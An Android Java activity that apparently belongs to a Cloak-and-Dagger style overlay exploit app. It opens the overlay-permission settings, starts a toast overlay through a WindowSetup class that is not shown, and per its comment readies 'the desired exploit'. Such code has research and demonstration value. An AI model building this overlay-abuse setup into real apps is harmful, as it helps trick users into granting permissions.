package andrews.cloakanddagger;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;


/** The setupActivity is just used to open the required permissions settings window
 *  and call the WindowSetup to create the toast overlay. If the permission needed is
 *  already granted then the desired exploit can be used.
 */
public class SetupActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_setup);

        WindowSetup setup = new WindowSetup(this);

        /**Checks whether the SYSTEM_ALERT permission is granted. If not call the startToast function from the WindowSetup class.**/
        if (!Settings.canDrawOverlays(this)) {

            /**Opens the system overlay settings screen**/
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent myIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                startActivity(myIntent);
            }

            setup.startToast(this);
        } else {

            Intent startMain = new Intent(Intent.ACTION_MAIN);
            startMain.addCategory(Intent.CATEGORY_HOME);
            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            this.startActivity(startMain);
            setup.bypassSetup(this);
        }

    }

}
